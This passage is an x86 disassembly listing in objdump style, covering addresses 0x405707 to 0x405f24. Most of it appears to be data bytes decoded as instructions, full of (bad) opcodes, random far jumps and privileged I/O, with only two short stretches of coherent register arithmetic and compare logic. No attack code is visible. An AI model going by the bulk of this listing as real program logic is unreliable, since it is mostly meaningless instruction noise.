  405707:	or     DWORD PTR [ecx],0x1d
  40570a:	dec    edi
  40570b:	hlt    
  40570c:	int3   
  40570d:	and    ebp,DWORD PTR [edi-0x6]
  405710:	into   
  405711:	xor    edi,DWORD PTR [ebx]
  405713:	dec    edi
  405714:	mov    gs,WORD PTR [ebx]
  405716:	xor    BYTE PTR [ebp-0x12],0x9f
  40571a:	sbb    ebx,DWORD PTR [edi+esi*4+0xc3b8398]
  405721:	jo     0x4056f4
  405723:	test   BYTE PTR [esi+ebx*2+0x18],0x47
  405728:	dec    ebx
  405729:	pop    esi
  40572a:	mov    DWORD PTR [edx+ecx*8+0x1b45c852],ebp
  405731:	xor    DWORD PTR [esi-0x3b],edx
  405734:	push   es
  405735:	xor    eax,0xc157e1d2
  40573a:	sbb    eax,0x6e46c8f3
  40573f:	mov    eax,ds:0xc0f6101a
  405744:	mov    edi,0x6d67d547
  405749:	mov    edi,0x81c4a248
  40574e:	push   edx
  40574f:	inc    edi
  405750:	shl    DWORD PTR [eax+ebp*1],cl
  405753:	dec    esi
  405754:	mov    WORD PTR [eax+0x63],es
  405757:	hlt    
  405758:	inc    ebx
  405759:	retf   0xd693
  40575c:	push   cs
  40575d:	stos   BYTE PTR es:[edi],al
  40575e:	cmp    al,0xd
  405760:	repz jb 0x4057cb
  405763:	add    BYTE PTR [eax-0x5d3d3f9],bl
  405769:	push   esi
  40576a:	repz xor al,0x49
  40576d:	or     esp,DWORD PTR [edx-0xd3f2af4]
  405773:	or     ecx,DWORD PTR [edx+ebx*2-0x4c4fe0f0]
  40577a:	xchg   edx,eax
  40577b:	into   
  40577c:	cli    
  40577d:	sti    
  40577e:	xor    ecx,ebp
  405780:	loop   0x4057bd
  405782:	pop    ecx
  405783:	inc    ecx
  405784:	call   0x27525b4b
  405789:	mov    DWORD PTR [ecx+0x70],ecx
  40578c:	cdq    
  40578d:	mov    cl,BYTE PTR [ebx+0x13ba5db1]
  405793:	jmp    0x942a42cb
  405798:	pop    edx
  405799:	popf   
  40579a:	loop   0x4057f4
  40579c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40579d:	adc    ah,ah
  40579f:	std    
  4057a0:	sti    
  4057a1:	pop    ebx
  4057a2:	(bad)  
  4057a3:	push   eax
  4057a4:	adc    BYTE PTR [ecx],dl
  4057a6:	push   0x870ef21f
  4057ab:	test   eax,0x93ec2eea
  4057b0:	pop    esi
  4057b1:	push   esp
  4057b2:	idiv   BYTE PTR [edx+esi*4+0x5b883d88]
  4057b9:	cmp    BYTE PTR [bx-0x2845],dh
  4057be:	imul   esp,DWORD PTR [ecx+0x5e4c581f],0x9a606207
  4057c8:	sub    ah,bl
  4057ca:	xchg   esi,eax
  4057cb:	fnstsw WORD PTR [ebx+0x78]
  4057ce:	push   edi
  4057cf:	mov    ecx,esi
  4057d1:	imul   ebx,DWORD PTR [eax-0x5ef3f6b2],0xffffffa8
  4057d8:	ja     0x4057f3
  4057da:	test   eax,0xe7463190
  4057df:	loop   0x405800
  4057e1:	cwde   
  4057e2:	sahf   
  4057e3:	adc    eax,0xbebcafb3
  4057e8:	fidivr DWORD PTR [esi+0x6d6fd6d4]
  4057ee:	jmp    0xf080:0x818f4060
  4057f5:	imul   BYTE PTR [eax-0x598ccdf9]
  4057fb:	int3   
  4057fc:	inc    esp
  4057fd:	(bad)
  405800:	mov    edx,esp
  405802:	lahf   
  405803:	iret   
  405804:	xchg   BYTE PTR ds:0x372355be,bl
  40580a:	xlat   BYTE PTR ds:[ebx]
  40580b:	(bad)
  40580f:	mov    ah,0x62
  405811:	dec    ecx
  405812:	test   BYTE PTR [ebx+0x5d547262],bh
  405818:	enter  0x5d38,0xb7
  40581c:	mov    cl,0xa3
  40581e:	loope  0x405823
  405820:	pusha  
  405821:	sub    DWORD PTR [eax-0x2b],ebx
  405824:	repnz int3 
  405826:	popa   
  405827:	arpl   si,si
  405829:	push   ebx
  40582a:	mov    esp,edi
  40582c:	std    
  40582d:	rol    DWORD PTR [ecx+ecx*8],0xcc
  405831:	rcr    DWORD PTR [eax-0x2e],cl
  405834:	(bad)  
  405835:	aad    0x7d
  405837:	sbb    DWORD PTR [edi-0x16af5cd0],ebp
  40583d:	(bad)  
  40583e:	pusha  
  40583f:	mov    al,0x1a
  405841:	cdq    
  405842:	mov    cl,0xc4
  405844:	xor    al,0x5c
  405846:	jmp    0x11e2:0xcedb994f
  40584d:	test   al,0xe3
  40584f:	frstor [esi+0x69]
  405852:	add    BYTE PTR [ecx+0x7e],0xb0
  405856:	iret   
  405857:	mov    eax,ds:0xec168db1
  40585c:	inc    edi
  40585d:	add    BYTE PTR [ecx-0x36425e6b],cl
  405863:	std    
  405864:	mov    dh,0x65
  405866:	add    ebx,DWORD PTR [ecx-0xeb1803]
  40586c:	inc    edx
  40586d:	addr16 mov dh,0x52
  405870:	int    0x84
  405872:	cmp    DWORD PTR [edx],edi
  405874:	jno    0x40586d
  405876:	and    esp,DWORD PTR [ebx]
  405878:	mov    cs,eax
  40587a:	xor    bl,ah
  40587c:	retf   
  40587d:	pop    es
  40587e:	mov    ecx,0xa3ea050e
  405883:	jmp    0xd17c:0xb5380f2a
  40588a:	outs   dx,DWORD PTR ds:[esi]
  40588b:	popf   
  40588c:	pushf  
  40588d:	xor    al,0x7c
  40588f:	repz add al,0x81
  405892:	in     eax,dx
  405893:	and    ebp,DWORD PTR [ebx-0x31]
  405896:	cwde   
  405897:	xchg   ebx,eax
  405898:	sbb    al,0xd3
  40589a:	inc    edi
  40589b:	jbe    0x4058c9
  40589d:	mov    esp,0xecc8f437
  4058a2:	test   cl,al
  4058a4:	adc    dl,BYTE PTR [ebp+0x55362027]
  4058aa:	push   ss
  4058ab:	mov    bh,0xee
  4058ad:	sbb    edi,DWORD PTR [esi+0x4f8a9171]
  4058b3:	test   ch,ch
  4058b5:	mov    WORD PTR [ebp-0x18],es
  4058b8:	push   eax
  4058b9:	ja     0x405874
  4058bb:	jecxz  0x405912
  4058bd:	out    0xc8,eax
  4058bf:	push   ss
  4058c0:	dec    edi
  4058c1:	xchg   ebp,eax
  4058c2:	fidivr DWORD PTR [eax+0x22]
  4058c5:	dec    edx
  4058c6:	std    
  4058c7:	dec    ecx
  4058c8:	cdq    
  4058c9:	jl     0x4058c9
  4058cb:	push   esp
  4058cc:	or     BYTE PTR [eax+0x10],ch
  4058cf:	mov    ds:0xb08de9d6,eax
  4058d4:	ja     0x40587f
  4058d6:	sub    DWORD PTR [ebx],esi
  4058d8:	pop    ecx
  4058d9:	xchg   ebp,eax
  4058da:	(bad)  
  4058db:	std    
  4058dc:	mov    BYTE PTR [ebp-0x3a862303],al
  4058e2:	mov    ecx,DWORD PTR [ecx-0x38fa3d02]
  4058e8:	fs (bad) 
  4058ea:	clc    
  4058eb:	imul   esi,DWORD PTR [edx],0xffffffb9
  4058ee:	shr    esp,0xbe
  4058f1:	mov    ds:0xbaee6d0d,eax
  4058f6:	push   eax
  4058f7:	dec    ecx
  4058f8:	int    0xf8
  4058fa:	sbb    al,0xa7
  4058fc:	inc    esp
  4058fd:	mov    ecx,0x21832058
  405902:	push   edi
  405903:	(bad)  
  405904:	call   0xb3a660fa
  405909:	lea    edx,[ebx-0x70]
  40590c:	sub    al,0x84
  40590e:	pop    esp
  40590f:	shl    DWORD PTR [ebx-0x4eb72f9c],1
  405915:	dec    ebp
  405916:	push   ds
  405917:	out    0x70,al
  405919:	stos   BYTE PTR es:[edi],al
  40591a:	arpl   WORD PTR [ecx-0x38cc8166],bx
  405920:	retf   0xe3e5
  405923:	call   0x69121f55
  405928:	sub    eax,0x4d950d9
  40592d:	push   ebp
  40592e:	sub    edi,DWORD PTR [ebp+0x30db316c]
  405934:	jae    0x4058e5
  405936:	add    ebp,DWORD PTR [edi+0x94a292a]
  40593c:	mov    edi,0x58d53352
  405941:	pushf  
  405942:	je     0x40594d
  405944:	jmp    0x405912
  405946:	dec    edx
  405947:	push   ss
  405948:	into   
  405949:	popf   
  40594a:	inc    ecx
  40594b:	data16 icebp 
  40594d:	xor    al,0x1b
  40594f:	js     0x4058dd
  405951:	pop    ecx
  405952:	test   BYTE PTR [ebp-0x64],bl
  405955:	mov    al,cl
  405957:	mov    ss,WORD PTR [esi+esi*2+0x4038cc3b]
  40595e:	mov    al,ds:0x2adaebee
  405963:	jo     0x4059b3
  405965:	ja     0x40594f
  405967:	adc    al,0x8b
  405969:	sbb    ah,dl
  40596b:	adc    bl,BYTE PTR [esi+edx*8+0x27]
  40596f:	or     edx,esp
  405971:	fild   WORD PTR [esi]
  405973:	les    ecx,FWORD PTR [ebx-0x66]
  405976:	cmp    al,0x5a
  405978:	imul   esp,DWORD PTR [edi-0x6d9c1f03],0xbe689762
  405982:	ret    0xa9dc
  405985:	add    cl,cl
  405987:	ins    DWORD PTR es:[edi],dx
  405988:	aam    0xca
  40598a:	icebp  
  40598b:	mov    esi,DWORD PTR [ecx-0x51]
  40598e:	and    BYTE PTR [edx],0xb3
  405991:	rcl    BYTE PTR [edi+0x5fd1aa0],1
  405997:	dec    eax
  405998:	int    0x92
  40599a:	arpl   di,dx
  40599c:	out    dx,al
  40599d:	sar    BYTE PTR [ecx],0xfd
  4059a0:	mov    esi,0xa9946fbb
  4059a5:	and    BYTE PTR [ebx+0x6b2ff6fc],0x66
  4059ac:	mov    DWORD PTR [esi-0x38a23777],ebx
  4059b2:	xor    BYTE PTR [ebx],dh
  4059b4:	retf   
  4059b5:	inc    edx
  4059b6:	lock cmp al,0xd6
  4059b9:	mov    eax,0xdb0b8358
  4059be:	mov    esi,0xe243689f
  4059c3:	jnp    0x4059ac
  4059c5:	(bad)  
  4059c6:	(bad)  
  4059c7:	jno    0x4059a5
  4059c9:	arpl   WORD PTR [ebp+ebp*1-0x30],cx
  4059cd:	jb     0x405a2a
  4059cf:	outs   dx,BYTE PTR ds:[esi]
  4059d0:	xor    BYTE PTR [esi-0x913a062],bl
  4059d6:	lods   eax,DWORD PTR gs:[esi]
  4059d8:	sti    
  4059d9:	ret    0x7d97
  4059dc:	pop    esi
  4059dd:	cwde   
  4059de:	jge    0x40599c
  4059e0:	aad    0x7
  4059e2:	xchg   esi,eax
  4059e3:	call   FWORD PTR [eax]
  4059e5:	mov    WORD PTR [ebx+edi*4+0x29],fs
  4059e9:	call   esi
  4059eb:	inc    esp
  4059ec:	add    eax,0x8a6d16ee
  4059f1:	(bad)  [ebx-0x8151e0b]
  4059f7:	enter  0x242c,0x5c
  4059fb:	xchg   ebp,eax
  4059fc:	pop    ebx
  4059fd:	fxch   st(5)
  4059ff:	cld    
  405a00:	out    0xea,eax
  405a02:	mov    ebp,edi
  405a04:	inc    edi
  405a05:	(bad)  
  405a06:	push   ebp
  405a07:	aaa    
  405a08:	aad    0xba
  405a0a:	jmp    0xc487:0x843df4d6
  405a11:	(bad)  
  405a12:	sub    DWORD PTR ds:0x2b4993eb,ebp
  405a18:	or     eax,0xfd43de92
  405a1d:	jg     0x4059e6
  405a1f:	mov    bh,0x67
  405a21:	fnsave [ebp+ebx*1-0x50]
  405a25:	int    0x7b
  405a27:	cli    
  405a28:	and    DWORD PTR [edx],esp
  405a2a:	push   ebx
  405a2b:	jns    0x4059b7
  405a2d:	shl    ah,1
  405a2f:	jmp    0x55f0:0xf47ab5fa
  405a36:	cdq    
  405a37:	test   DWORD PTR [edx+0x655b5bec],ebx
  405a3d:	cmp    DWORD PTR [edi+0xd],eax
  405a40:	mov    edx,ecx
  405a42:	gs cs std 
  405a45:	mov    bl,0x1a
  405a47:	inc    ecx
  405a48:	es mov eax,es:0xd4a0d295
  405a4f:	(bad)  
  405a50:	cmp    al,0x1d
  405a52:	lds    esi,FWORD PTR [esi+0x475b4e66]
  405a58:	sbb    DWORD PTR [edi],ecx
  405a5a:	nop
  405a5b:	(bad)  
  405a5c:	scas   eax,DWORD PTR es:[edi]
  405a5d:	or     dh,BYTE PTR [esi+0x16]
  405a60:	xlat   BYTE PTR ds:[ebx]
  405a61:	test   eax,0x8591fb5d
  405a66:	lock sub eax,0xa4d5b761
  405a6c:	sbb    eax,0xe71a4274
  405a71:	pop    edx
  405a72:	push   0x23
  405a74:	ret    0xcf33
  405a77:	mov    DWORD PTR [ebp-0x4],eax
  405a7a:	mov    DWORD PTR [ebp+0x14],ecx
  405a7d:	xor    eax,eax
  405a7f:	or     DWORD PTR [ebp+0x14],eax
  405a82:	mov    eax,DWORD PTR [ebp-0x50]
  405a85:	mov    ecx,DWORD PTR [ebp-0x4c]
  405a88:	shrd   eax,ecx,0x2
  405a8c:	shr    ecx,0x2
  405a8f:	mov    cx,ax
  405a92:	mov    eax,DWORD PTR [ebp-0x50]
  405a95:	mov    edx,0x6d5d
  405a9a:	xor    cx,dx
  405a9d:	mov    edx,DWORD PTR [ebp-0x4c]
  405aa0:	xor    edx,edx
  405aa2:	shl    eax,0x1e
  405aa5:	mov    ax,dx
  405aa8:	or     ax,cx
  405aab:	mov    ecx,DWORD PTR [ebp-0x4]
  405aae:	cmp    WORD PTR [ecx],ax
  405ab1:	je     0x406288
  405ab7:	mov    eax,DWORD PTR [ebp+0x14]
  405aba:	sub    DWORD PTR [ebp-0x4],eax
  405abd:	mov    eax,DWORD PTR [esi]
  405abf:	jmp    0x405e60
  405ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ac5:	test   eax,0x3c522b52
  405aca:	mov    eax,0x46ddf0ac
  405acf:	xchg   edx,eax
  405ad0:	hlt    
  405ad1:	cdq    
  405ad2:	or     bh,0xbd
  405ad5:	and    eax,0xc4bdbebe
  405ada:	mov    esi,0xc3073ebe
  405adf:	shr    ebx,0x2e
  405ae2:	adc    edi,esp
  405ae4:	sub    ebp,DWORD PTR [ebx]
  405ae6:	adc    DWORD PTR ss:[ecx+0x3c],ebx
  405aea:	inc    ebp
  405aeb:	jae    0x405aba
  405aed:	in     al,0xc4
  405aef:	enter  0x682,0x36
  405af3:	test   edi,eax
  405af5:	pop    eax
  405af6:	outs   dx,DWORD PTR ds:[esi]
  405af7:	dec    ebx
  405af8:	popf   
  405af9:	mov    ah,0x51
  405afb:	je     0x405b1b
  405afd:	daa    
  405afe:	xchg   ebp,eax
  405aff:	lahf   
  405b00:	xchg   ebp,eax
  405b01:	leave  
  405b02:	stos   BYTE PTR es:[edi],al
  405b03:	stc    
  405b04:	cs js  0x405a8c
  405b07:	jge    0x405ad9
  405b09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b0a:	sahf   
  405b0b:	loop   0x405b11
  405b0d:	cwde   
  405b0e:	add    esp,ebp
  405b10:	inc    ecx
  405b11:	dec    ebx
  405b12:	mov    ds:0x6284e046,eax
  405b17:	or     eax,0x9b535388
  405b1c:	dec    BYTE PTR [ebx+0x4f463173]
  405b22:	sbb    al,0x44
  405b24:	je     0x405b07
  405b26:	imul   ebp,DWORD PTR [edx+0x6a],0xcd7ecb1c
  405b2d:	ror    BYTE PTR [ecx-0x62],cl
  405b30:	inc    esp
  405b31:	xor    eax,0xf1481a95
  405b36:	enter  0x49ed,0xd5
  405b3a:	imul   eax,DWORD PTR [esi-0x9bfe166],0x98b370e
  405b44:	push   ecx
  405b45:	shr    edx,1
  405b47:	test   eax,0x90910177
  405b4c:	mov    ?,ecx
  405b4e:	sbb    DWORD PTR [ebx+0x1891ae62],ecx
  405b54:	shl    bl,cl
  405b56:	stos   DWORD PTR es:[edi],eax
  405b57:	ins    BYTE PTR es:[edi],dx
  405b58:	cmp    eax,0xf0723f63
  405b5d:	mov    esp,0xe273e97
  405b62:	dec    edi
  405b63:	shl    BYTE PTR [ecx-0x28],cl
  405b66:	xor    eax,0x65367263
  405b6b:	nop
  405b6c:	fst    QWORD PTR [ecx+0x9c2eb5f]
  405b72:	arpl   WORD PTR [edi+0x8],ax
  405b75:	pop    esi
  405b76:	mov    ah,0x13
  405b78:	sbb    DWORD PTR [ebp-0x73417219],ebx
  405b7e:	scas   al,BYTE PTR es:[edi]
  405b7f:	push   dx
  405b81:	xor    ebp,DWORD PTR [eax-0x3ccd7729]
  405b87:	out    dx,eax
  405b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b89:	adc    BYTE PTR [esi+0x7a],cl
  405b8c:	sti    
  405b8d:	sbb    bl,BYTE PTR [ebx]
  405b8f:	stos   DWORD PTR es:[edi],eax
  405b90:	lock sahf 
  405b92:	dec    edi
  405b93:	jbe    0x405bbf
  405b95:	mov    ds:0xdebefa0e,eax
  405b9a:	pop    esi
  405b9b:	out    dx,al
  405b9c:	cmp    eax,0xa1819885
  405ba1:	hlt    
  405ba2:	dec    ebp
  405ba3:	sbb    DWORD PTR ss:[ebx],0x5
  405ba7:	test   eax,0x719a31a9
  405bac:	xchg   dl,ch
  405bae:	lods   eax,DWORD PTR ds:[esi]
  405baf:	push   es
  405bb0:	shl    DWORD PTR [ebx-0x5046b542],cl
  405bb6:	stos   DWORD PTR es:[edi],eax
  405bb7:	cld    
  405bb8:	inc    edi
  405bb9:	cmp    eax,0xee9862e8
  405bbe:	mov    ah,0x39
  405bc0:	push   0x3d355f7d
  405bc5:	mov    ebp,edx
  405bc7:	in     eax,0xb3
  405bc9:	sahf   
  405bca:	fidivr DWORD PTR [edx+0x4efd0567]
  405bd0:	lods   eax,DWORD PTR ds:[esi]
  405bd1:	xor    eax,0x2cceceb1
  405bd6:	int    0x4b
  405bd8:	js     0x405c1c
  405bda:	lods   al,BYTE PTR ds:[esi]
  405bdb:	dec    eax
  405bdc:	xchg   edx,eax
  405bdd:	mov    BYTE PTR [ebx-0x7f5a9df0],ah
  405be3:	ds es jg 0x405c12
  405be7:	imul   edi,DWORD PTR [edx-0xd],0xd
  405beb:	lods   eax,DWORD PTR ds:[esi]
  405bec:	jo     0x405b79
  405bee:	mov    dh,0xc2
  405bf0:	push   esi
  405bf1:	xchg   edx,eax
  405bf2:	dec    ebx
  405bf3:	popf   
  405bf4:	jecxz  0x405bce
  405bf6:	cmp    DWORD PTR [ecx+esi*8+0x12],0xcc46f9e0
  405bfe:	push   cs
  405bff:	into   
  405c00:	sbb    ax,0xbe6
  405c04:	adc    BYTE PTR [edi],0x1e
  405c07:	retf   0x328a
  405c0a:	fsubp  st(7),st
  405c0c:	in     eax,0x3c
  405c0e:	cdq    
  405c0f:	dec    ecx
  405c10:	dec    ebx
  405c11:	adc    BYTE PTR [ecx-0x24],bl
  405c14:	fdiv   DWORD PTR [ecx+esi*4]
  405c17:	xor    BYTE PTR [ebp+0x4c],0x62
  405c1b:	sbb    edx,eax
  405c1d:	inc    edi
  405c1e:	outs   dx,DWORD PTR cs:[esi]
  405c20:	retf   
  405c21:	mov    ebx,0xf94d7ca7
  405c26:	repnz fdiv QWORD PTR [ebx+0x46]
  405c2a:	pop    ds
  405c2b:	mov    ebx,0xd42a6eaf
  405c30:	out    0x64,al
  405c32:	dec    ebx
  405c33:	mov    ch,0x67
  405c35:	bound  ecx,QWORD PTR [eax+0x308294b8]
  405c3b:	sbb    eax,0x4f91f732
  405c40:	xor    DWORD PTR [edi-0x4def283f],esi
  405c46:	push   ebx
  405c47:	and    cl,BYTE PTR cs:[eax-0x4e1c6fc0]
  405c4e:	add    dh,BYTE PTR [eax]
  405c50:	clc    
  405c51:	xchg   edi,eax
  405c52:	mov    ds:0x1625ac1b,eax
  405c57:	out    dx,eax
  405c58:	out    dx,eax
  405c59:	jae    0x405c7f
  405c5b:	mov    ds:0xefec0551,al
  405c60:	ins    BYTE PTR es:[edi],dx
  405c61:	xor    al,0x1a
  405c63:	fs test eax,0x98f757c8
  405c69:	fs cwde 
  405c6b:	mov    bh,0xdb
  405c6d:	xchg   edx,eax
  405c6e:	and    DWORD PTR ds:0x4d5d67eb,0x56
  405c75:	push   edi
  405c76:	(bad)  
  405c77:	cmp    eax,0xfef86a25
  405c7c:	nop
  405c7d:	aas    
  405c7e:	test   BYTE PTR [edi-0x1bdba235],0xa9
  405c85:	int3   
  405c86:	push   es
  405c87:	sbb    ecx,DWORD PTR [ecx-0x10]
  405c8a:	cmp    eax,0x7f98186c
  405c8f:	push   cs
  405c90:	or     DWORD PTR [esp+esi*8-0xe1d10d7],esi
  405c97:	or     BYTE PTR [ebx+0x34a414cb],dl
  405c9d:	(bad)  
  405c9e:	push   edx
  405c9f:	mov    eax,0x72453b4a
  405ca4:	test   al,0xee
  405ca6:	fst    QWORD PTR [ebx]
  405ca8:	pop    ebx
  405ca9:	xchg   ebx,eax
  405caa:	sub    eax,0x8145bc61
  405caf:	lock out 0x1d,al
  405cb2:	xor    BYTE PTR [ecx-0x22],al
  405cb5:	pop    esp
  405cb6:	(bad)  
  405cb7:	push   ebp
  405cb8:	sahf   
  405cb9:	adc    eax,0x58c8b6d9
  405cbe:	pop    esi
  405cbf:	cmc    
  405cc0:	add    edx,edx
  405cc2:	adc    BYTE PTR [eax],0x56
  405cc5:	xlat   BYTE PTR ds:[ebx]
  405cc6:	fist   DWORD PTR [ebp+0x3a2098f9]
  405ccc:	sub    eax,0xdfbeee4b
  405cd1:	mov    ch,BYTE PTR [ecx+0x38221051]
  405cd7:	or     eax,0x95f9ca9a
  405cdc:	test   al,0xae
  405cde:	ja     0x405c6c
  405ce0:	fwait
  405ce1:	outs   dx,DWORD PTR ds:[esi]
  405ce2:	inc    esp
  405ce3:	xor    edx,DWORD PTR [ebx-0x39]
  405ce6:	nop
  405ce7:	aad    0xde
  405ce9:	jmp    0x5542:0x4767e1e9
  405cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cf1:	dec    ecx
  405cf2:	or     cl,0xa7
  405cf5:	jecxz  0x405d65
  405cf7:	and    al,0x1c
  405cf9:	mov    eax,0x3a32267d
  405cfe:	pop    es
  405cff:	pop    eax
  405d00:	xor    BYTE PTR [edx],ch
  405d02:	pop    ecx
  405d03:	sbb    eax,0x59f2bea5
  405d08:	mov    ah,0x26
  405d0a:	ds into 
  405d0c:	fisttp QWORD PTR ds:0xe5ca2578
  405d12:	add    al,0xc0
  405d14:	jb     0x405cf7
  405d16:	hlt    
  405d17:	adc    ebx,ebx
  405d19:	xchg   DWORD PTR [eax],ebx
  405d1b:	mov    edi,0xda73adf4
  405d20:	dec    ebp
  405d21:	sub    eax,0x53f7fdc
  405d26:	lds    eax,FWORD PTR [ebp+0x60]
  405d29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d2a:	xchg   ebx,eax
  405d2b:	test   DWORD PTR [ebp-0x50],0x3d6d835b
  405d32:	mov    esp,0x64db0b7c
  405d37:	xchg   esp,eax
  405d38:	push   esp
  405d39:	(bad)  
  405d3a:	bnd jae 0x405d95
  405d3d:	popf   
  405d3e:	out    0x81,al
  405d40:	jge    0x405ce0
  405d42:	adc    al,0x31
  405d44:	outs   dx,DWORD PTR ds:[esi]
  405d45:	(bad)  
  405d46:	fnsave ds:0x2828c32c
  405d4c:	xor    esi,edi
  405d4e:	add    DWORD PTR [esi+0x3ae09342],ebx
  405d54:	fdivrp st(1),st
  405d56:	je     0x405da9
  405d58:	test   eax,0x2f7e0f46
  405d5d:	mov    eax,0x2fd24d61
  405d62:	sub    ebx,0xffffffd4
  405d65:	jmp    0x405d33
  405d67:	out    0x9a,eax
  405d69:	loop   0x405dbe
  405d6b:	out    dx,eax
  405d6c:	sbb    eax,0xa21b44e4
  405d71:	(bad)  
  405d72:	mov    ah,0x73
  405d74:	pop    ss
  405d75:	js     0x405d65
  405d77:	push   cs
  405d78:	pop    ds
  405d79:	mov    dh,0x1b
  405d7b:	or     ah,BYTE PTR [ebx+0x1f32ce1c]
  405d81:	or     BYTE PTR [ebx-0x129a4447],al
  405d87:	mov    esi,0x9c32eee9
  405d8c:	fisubr DWORD PTR [ecx]
  405d8e:	shl    ch,0xe9
  405d91:	cmp    BYTE PTR [eax-0x7ae5c1ed],0x83
  405d98:	push   ecx
  405d99:	fwait
  405d9a:	dec    esi
  405d9b:	ficom  DWORD PTR [ecx]
  405d9d:	(bad)  
  405d9f:	adc    ebp,DWORD PTR [eax+0x33a9a904]
  405da5:	push   ebx
  405da6:	push   ebp
  405da7:	int    0x17
  405da9:	sbb    eax,0x4f3dfed9
  405dae:	push   cs
  405daf:	out    0xe2,eax
  405db1:	imul   eax,ebp,0x7fff4f56
  405db7:	adc    DWORD PTR [ebx-0x54],0x8dba15da
  405dbe:	outs   dx,BYTE PTR ds:[esi]
  405dbf:	js     0x405d75
  405dc1:	or     BYTE PTR [ebx+0x421573cc],0x24
  405dc8:	enter  0xa67b,0xb2
  405dcc:	fwait
  405dcd:	pusha  
  405dce:	scas   eax,DWORD PTR es:[edi]
  405dcf:	out    0x7c,eax
  405dd1:	or     edi,esp
  405dd3:	in     eax,0xa4
  405dd5:	in     al,dx
  405dd6:	add    eax,0x16b128a
  405ddb:	scas   al,BYTE PTR es:[edi]
  405ddc:	loopne 0x405d92
  405dde:	jecxz  0x405de1
  405de0:	push   ebx
  405de1:	xor    al,0xd7
  405de3:	and    DWORD PTR [edi-0x68676c59],ebp
  405de9:	fsub   QWORD PTR [esi]
  405deb:	pop    ebp
  405dec:	gs enter 0x6fe3,0xc9
  405df1:	or     cl,dh
  405df3:	rcl    bl,cl
  405df5:	mov    ah,0xdc
  405df7:	adc    DWORD PTR [ecx],esp
  405df9:	lods   eax,DWORD PTR ds:[esi]
  405dfa:	out    0xc6,al
  405dfc:	fsub   DWORD PTR [edi]
  405dfe:	sahf   
  405dff:	cmp    BYTE PTR [edi+ecx*4+0x75],0x37
  405e04:	mov    dh,0xa2
  405e06:	sub    DWORD PTR [ebx],0xb98fd2a3
  405e0c:	mov    bh,0x83
  405e0e:	lods   al,BYTE PTR ds:[esi]
  405e0f:	add    eax,0x69ee31d5
  405e14:	push   esp
  405e15:	test   DWORD PTR [edi-0x29],edx
  405e18:	rol    DWORD PTR [edx],1
  405e1a:	rcr    al,cl
  405e1c:	aaa    
  405e1d:	or     eax,0x7df8b6e4
  405e22:	pop    eax
  405e23:	data16 mov BYTE PTR [ecx+0x3],dh
  405e27:	push   edx
  405e28:	xchg   ebx,eax
  405e29:	jle    0x405e07
  405e2b:	jo     0x405e74
  405e2d:	inc    DWORD PTR [ecx-0x79]
  405e30:	xor    dl,cl
  405e32:	bound  esp,QWORD PTR [ecx+ecx*1-0x6ae8365c]
  405e39:	aam    0xa4
  405e3b:	mov    dl,0x62
  405e3d:	stos   DWORD PTR es:[edi],eax
  405e3e:	retf   0x215c
  405e41:	push   0x80f54912
  405e46:	into   
  405e47:	and    al,0x99
  405e49:	std    
  405e4a:	dec    ecx
  405e4b:	xor    esp,DWORD PTR [ecx+0xe64763f]
  405e51:	inc    esp
  405e52:	and    ebx,eax
  405e54:	and    BYTE PTR [ebp+0xc],bh
  405e57:	xlat   BYTE PTR ds:[ebx]
  405e58:	xor    DWORD PTR [ebx-0x12fd153a],esi
  405e5e:	cmc    
  405e5f:	or     DWORD PTR [ebx-0x3774fbb2],ecx
  405e65:	shl    ecx,0x1e
  405e68:	xor    ecx,0x80000000
  405e6e:	mov    DWORD PTR [ebp-0x64],ecx
  405e71:	mov    ecx,DWORD PTR [esi]
  405e73:	mov    edx,DWORD PTR [esi+0x4]
  405e76:	jmp    0x406217
  405e7b:	pusha  
  405e7c:	adc    bh,BYTE PTR ds:0x60b2b35d
  405e82:	adc    al,0xa6
  405e84:	pop    es
  405e85:	fld    QWORD PTR ds:[eax+0x18]
  405e89:	xor    al,0xdd
  405e8b:	mov    esi,0xbdbebe2d
  405e90:	les    edi,FWORD PTR [esi-0x71f2f142]
  405e96:	mov    WORD PTR ds:0x9843c3b4,ds
  405e9c:	xor    DWORD PTR [ecx],edx
  405e9e:	pop    ebp
  405e9f:	mov    esp,0x56fc5fe8
  405ea4:	je     0x405e87
  405ea6:	cmc    
  405ea7:	mov    esi,0xcf9ea72c
  405eac:	daa    
  405ead:	xchg   ebp,eax
  405eae:	imul   BYTE PTR [edx-0x50]
  405eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405eb2:	mov    dh,0x21
  405eb4:	sbb    eax,0xb2e2f267
  405eb9:	push   cs
  405eba:	cmp    al,0xf8
  405ebc:	adc    dh,BYTE PTR [ecx]
  405ebe:	mov    eax,ds:0x5989bf74
  405ec3:	(bad)  
  405ec4:	cdq    
  405ec5:	mov    ?,WORD PTR [esp+edi*2+0x31]
  405ec9:	xor    DWORD PTR [ecx-0x60],edx
  405ecc:	xchg   ecx,eax
  405ecd:	xchg   edx,eax
  405ece:	pushf  
  405ecf:	out    dx,al
  405ed0:	sub    BYTE PTR [ebp+0x2a],bh
  405ed3:	mov    ah,0x7a
  405ed5:	mov    eax,0x97d220be
  405eda:	ins    DWORD PTR es:[edi],dx
  405edb:	ror    BYTE PTR [edx],0x29
  405ede:	jecxz  0x405f07
  405ee0:	mov    ecx,0xb80b4ccc
  405ee5:	jmp    0xcb4f:0xd5a8afab
  405eec:	aam    0x4d
  405eee:	cmp    BYTE PTR [ecx],dl
  405ef0:	imul   ebx,DWORD PTR [ecx],0xcc753fe3
  405ef6:	repz sub al,0x30
  405ef9:	call   0xf198:0xe62d724
  405f00:	xlat   BYTE PTR ds:[bx]
  405f02:	jne    0x405f46
  405f04:	adc    eax,0xd8770f7d
  405f09:	lock adc DWORD PTR [ebp+0x72],edx
  405f0d:	lods   al,BYTE PTR ds:[esi]
  405f0e:	int3   
  405f0f:	pop    esi
  405f10:	pop    ss
  405f11:	call   0xae0d:0xef30e1d
  405f18:	imul   BYTE PTR [ebx]
  405f1a:	cmp    BYTE PTR [esi+0x501df1c2],dh
  405f20:	pop    ebp
  405f21:	pop    eax
  405f22:	push   edx
  405f23:	dec    ecx
  405f24:	dec    edi
